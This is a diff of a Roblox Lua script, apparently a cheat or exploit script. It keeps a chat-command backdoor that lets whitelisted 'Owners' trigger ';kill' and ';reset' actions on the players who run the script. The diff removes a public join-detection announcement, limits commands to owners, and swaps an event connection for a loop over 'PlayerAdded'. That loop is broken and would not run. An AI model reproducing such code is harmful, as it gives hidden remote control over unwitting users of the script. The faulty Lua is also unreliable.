@@ -288,24 +288,9 @@ spawn(function()
 	end)
 end)
 
-spawn(function()
-	for i,v in pairs(game:GetService("Players"):GetChildren()) do
-	if table.find(whitelist.Players,v.UserId) then
-			sysmsg("[DETECTED] PRIVATE WAS IN YOU GAME")
-			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("DETECTED_R7SK8TRXPARC2", "All")
-		end
-	end
-	game:GetService("Players").ChildAdded:Connect(function(v)
-		if table.find(whitelist.Players,v.UserId) then
-			sysmsg("[DETECTED] PRIVATE WAS IN YOU GAME!")
-			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("DETECTED_R7SK8TRXPARC", "All")
-		end
-	end)
-end)
-
 for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	v.Chatted:Connect(function(a) 
-		if table.find(whitelist.Owners,v.UserId) or table.find(whitelist.Players,v.UserId) then
+		if table.find(whitelist.Owners,v.UserId) then
 			if a == ";kill" then
 				funcs:kill()
 			elseif a == ";reset" then
@@ -346,9 +331,9 @@ for i,v in pairs(game:GetService("Players"):GetChildren()) do
 		end
 	end)
 end
-game:GetService("Players").PlayerAdded:Connect(function(v)
+for i,v in pairs(game:GetService("Players").PlayerAdded) do
 	v.Chatted:Connect(function(a) 
-		if table.find(whitelist.Owners,v.UserId) or table.find(whitelist.Players,v.UserId) then
+		if table.find(whitelist.Owners,v.UserId) then
 			if a == ";kill" then
 				funcs:kill()
 			elseif a == ";reset" then
@@ -386,4 +371,4 @@ game:GetService("Players").PlayerAdded:Connect(function(v)
 			end
 		end
 	end)
-end)
+end
